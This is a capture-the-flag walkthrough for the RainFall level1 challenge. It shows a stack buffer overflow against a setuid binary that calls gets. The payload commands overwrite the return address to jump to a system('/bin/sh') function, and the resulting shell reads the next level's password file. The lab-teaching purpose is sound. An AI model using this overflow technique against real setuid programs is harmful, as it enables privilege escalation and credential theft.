# level1 walkthrough

We are given a `level1` suid binary, which is a simple C program that awaits for input and then exits.

By dumping the binary with `objdump`, we can see it has a `main` function, as well as a `run` function. See [source.c](./source.c) for more information (compile with `-fno-stack-protector`).

The `main` function has a `gets` call, while the `run` function has a call to `system("/bin/sh")`; the goal of this level is to hijack our way into the `run` function.

We can do so by trying to overwrite the return address on the stack via a buffer overflow; we'll first figure out a right offset:

```
level1@RainFall:~$ python -c 'print "A"*100' | ./level1`
Segmentation fault (core dumped)
level1@RainFall:~$ python -c 'print "A"*50' | ./level1`
level1@RainFall:~$ python -c 'print "A"*75' | ./level1`
level1@RainFall:~$ python -c 'print "A"*76' | ./level1`
Illegal instruction (core dumped)
```

So we know that the offset is 76 bytes. We can then take the address of the `run` function (`0x0804844`), convert it to little-endian hex bytes (`\x44\x84\x04\x08`), and append it to our payload:

```
level1@RainFall:~$ python -c 'print "A"*76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Good... Wait what?

We got the print statement from the `run` function, but where's our shell?!

Well, since we're passing the input as a pipe, `/bin/sh` won't see an interactive stdin, and will just terminate. We can get around this issue with a little shell trickery. Here's the final exploit:

```
level1@RainFall:~$ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
<pass>
```

And there we have it, we can now login as `level2`!
